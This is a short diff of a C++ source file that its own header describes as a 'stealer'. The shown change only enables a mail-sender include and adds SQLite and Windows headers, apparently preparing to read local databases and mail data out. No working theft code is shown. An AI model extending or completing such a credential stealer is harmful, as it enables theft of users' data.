@@ -3,10 +3,15 @@
 // Author      : Hleb Hatouka
 // Description : stealer in C++
 //============================================================================
-//#include "mailsender.h"
+#include "mailsender.h"
 #include <exception>
 #include <filesystem>
 #include <iostream>
+#include "sqlite3.h"
+
+#ifdef _WIN32
+#include <windows.h>
+#endif
 
 namespace fs = std::filesystem;
 
